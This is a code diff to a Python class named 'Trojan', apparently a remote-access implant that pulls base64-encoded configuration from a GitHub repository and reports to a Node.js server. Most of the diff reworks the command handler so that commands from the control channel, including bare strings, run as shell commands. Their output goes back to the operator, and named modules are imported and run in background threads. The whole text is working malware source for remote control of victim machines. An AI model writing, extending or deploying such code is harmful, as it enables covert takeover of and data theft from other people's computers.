@@ -30,8 +30,14 @@ class Trojan:
         self.running = True
 
     def get_github_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
-        return json.loads(base64.b64decode(config_json))
+        try:
+            config_json = get_file_contents('config', self.config_file, self.repo)
+            decoded_config = base64.b64decode(config_json).decode('utf-8')
+            print(f"Decoded config JSON: {decoded_config}")  # Debug output
+            return json.loads(decoded_config)
+        except Exception as e:
+            print(f"Error fetching GitHub config: {e}")
+            raise
 
     def get_nodejs_config(self):
         try:
@@ -62,47 +68,38 @@ class Trojan:
             print(f"[*] Failed to update status on Node.js server: {e}")
 
     def execute_command(self, command):
-        command_type = command.get('type')
-        
-        if command_type == 'shell':
-            shell_command = command.get('command')
-            if shell_command:
-                try:
-                    result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
-                    result = result.decode('utf-8')
-                except subprocess.CalledProcessError as e:
-                    result = e.output.decode('utf-8')
-                self.send_command_result(shell_command, result)
-            else:
-                print(f"[*] No shell command provided in command: {command}")
-        
-        elif command_type == 'module':
-            module_name = command.get('module')
-            if module_name:
-                print(f"[*] Running module: {module_name}")
-                thread = threading.Thread(target=self.module_runner, args=(module_name,))
-                thread.start()
-            else:
-                print(f"[*] No module name provided in command: {command}")
-        
+        # If command is a dictionary, check type and handle accordingly
+        if isinstance(command, dict):
+            command_type = command.get('type')
+            if command_type == 'shell':
+                shell_command = command.get('command')
+                if shell_command:
+                    try:
+                        result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
+                        result = result.decode('utf-8')
+                    except subprocess.CalledProcessError as e:
+                        result = e.output.decode('utf-8')
+                    self.send_command_result(shell_command, result)
+            elif command_type == 'module':
+                module_name = command.get('module')
+                if module_name:
+                    if module_name not in sys.modules:
+                        # Assuming modules are dynamically imported
+                        importlib.import_module(module_name)
+                    thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                    thread.start()
         else:
-            print(f"[*] Unknown command type: {command_type}")
+            # Handle as a shell command if command is a string
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                result = result.decode('utf-8')
+            except subprocess.CalledProcessError as e:
+                result = e.output.decode('utf-8')
+            self.send_command_result(command, result)
 
     def module_runner(self, module):
-        if module in sys.modules:
-            result = sys.modules[module].run()
-            self.store_module_result(result)
-        else:
-            print(f"[*] Module {module} is not loaded. Attempting to load it...")
-            try:
-                importlib.import_module(module)
-                if module in sys.modules:
-                    result = sys.modules[module].run()
-                    self.store_module_result(result)
-                else:
-                    print(f"[*] Failed to load module {module}")
-            except Exception as e:
-                print(f"[*] Error importing module {module}: {e}")
+        result = sys.modules[module].run()
+        self.store_module_result(result)
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
